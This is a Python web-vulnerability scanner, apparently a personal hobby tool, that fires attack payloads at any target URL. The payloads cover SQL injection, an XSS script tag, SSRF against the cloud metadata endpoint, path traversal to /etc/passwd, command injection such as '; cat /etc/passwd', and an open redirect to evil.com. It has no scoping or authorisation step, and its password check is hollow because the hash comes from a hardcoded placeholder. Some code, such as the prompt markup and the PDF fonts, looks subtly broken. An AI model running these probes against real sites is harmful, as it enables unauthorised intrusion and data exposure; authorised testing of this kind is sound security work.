import argparse
import requests
import json
import bcrypt
import getpass
import shodan
import nmap
import os
import socket
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
import threading
import re
import subprocess
from fpdf import FPDF

console = Console()

# إعداد كلمة المرور
PASSWORD_HASH = bcrypt.hashpw(b"ur password", bcrypt.gensalt())

def verify_password():
    password = getpass.getpass("[bold cyan]أدخل كلمة المرور: [/bold cyan]").encode('utf-8')
    if bcrypt.checkpw(password, PASSWORD_HASH):
        console.print("[green]✔ تم التحقق من كلمة المرور![/green]")
        return True
    else:
        console.print("[red]❌ كلمة المرور خاطئة![/red]")
        return False

# إنشاء مجلد النتائج إن لم يكن موجودًا
if not os.path.exists("results"):
    os.makedirs("results")

def save_result(filename, data):
    with open(f"results/{filename}.txt", "w", encoding="utf-8") as file:
        file.write(data)

# فحص SQL Injection
def scan_sql_injection(url):
    payloads = ["'", '"', " OR 1=1 --", " OR '1'='1"]
    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)
        if "mysql" in response.text.lower() or "sql" in response.text.lower():
            console.print(f"[red]❌ الموقع قد يكون معرضًا لهجوم SQL Injection: {test_url}[/red]")
            save_result("sql_injection", f"Vulnerable: {test_url}")
            return
    console.print("[green]✔ لا يوجد SQL Injection واضح[/green]")

# فحص XSS
def scan_xss(url):
    payload = "<script>alert('XSS')</script>"
    response = requests.get(f"{url}{payload}")
    if payload in response.text:
        console.print(f"[red]❌ الموقع معرض لهجوم XSS: {url}[/red]")
        save_result("xss", f"Vulnerable: {url}")
    else:
        console.print("[green]✔ لا يوجد XSS واضح[/green]")

# فحص SSRF
def scan_ssrf(url):
    payload = "http://169.254.169.254/latest/meta-data/"
    response = requests.get(f"{url}{payload}")
    if "instance-id" in response.text:
        console.print(f"[red]❌ الموقع معرض لهجوم SSRF: {url}[/red]")
        save_result("ssrf", f"Vulnerable: {url}")
    else:
        console.print("[green]✔ لا يوجد SSRF واضح[/green]")

# فحص LFI
def scan_lfi(url):
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    for payload in payloads:
        response = requests.get(f"{url}{payload}")
        if "root:x:" in response.text or "for 16-bit app support" in response.text:
            console.print(f"[red]❌ الموقع معرض لهجوم LFI: {url}[/red]")
            save_result("lfi", f"Vulnerable: {url}")

# فحص RCE
def scan_rce(url):
    payloads = ["; id", "; uname -a", "; cat /etc/passwd"]
    for payload in payloads:
        response = requests.get(f"{url}{payload}")
        if "uid=" in response.text or "root:x:" in response.text:
            console.print(f"[red]❌ الموقع معرض لهجوم RCE: {url}[/red]")
            save_result("rce", f"Vulnerable: {url}")

# فحص Open Redirect
def scan_open_redirect(url):
    payload = url + "/redirect?url=https://evil.com"
    response = requests.get(payload, allow_redirects=False)
    if response.status_code in [301, 302] and "evil.com" in response.headers.get("Location", ""):
        console.print(f"[red]❌ الموقع معرض لهجوم Open Redirect: {url}")
        save_result("open_redirect", f"Vulnerable: {url}")

# توليد تقرير PDF
def generate_pdf_report():
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, "تقرير فحص MONSIF Security Tool", ln=True, align='C')
    
    for file in os.listdir("results"):
        pdf.cell(200, 10, f"{file}", ln=True, align='L')
        with open(f"results/{file}", "r", encoding="utf-8") as f:
            pdf.multi_cell(0, 10, f.read())
    
    pdf.output("results/scan_report.pdf")
    console.print("[green]✔ تم إنشاء تقرير PDF بنجاح![/green]")

# تشغيل الأداة
def main():
    if not verify_password():
        exit()
    
    console.print("[bold red]MONSIF Security Tool[/bold red] - [bold cyan]Advanced Website Scanner[/bold cyan]")
    console.print("[bold green]Developed by MONSIF[/bold green]\n")
    
    parser = argparse.ArgumentParser(description="أداة MONSIF لفحص أمان المواقع")
    parser.add_argument("-u", "--url", help="رابط الموقع المستهدف")
    parser.add_argument("--sql", action="store_true", help="فحص SQL Injection")
    parser.add_argument("--xss", action="store_true", help="فحص XSS")
    parser.add_argument("--ssrf", action="store_true", help="فحص SSRF")
    parser.add_argument("--lfi", action="store_true", help="فحص LFI")
    parser.add_argument("--rce", action="store_true", help="فحص RCE")
    parser.add_argument("--open-redirect", action="store_true", help="فحص Open Redirect")
    parser.add_argument("--report", action="store_true", help="توليد تقرير PDF")
    
    args = parser.parse_args()
    if args.sql:
        scan_sql_injection(args.url)
    if args.xss:
        scan_xss(args.url)
    if args.ssrf:
        scan_ssrf(args.url)
    if args.lfi:
        scan_lfi(args.url)
    if args.rce:
        scan_rce(args.url)
    if args.open_redirect:
        scan_open_redirect(args.url)
    if args.report:
        generate_pdf_report()

if __name__ == "__main__":
    main()
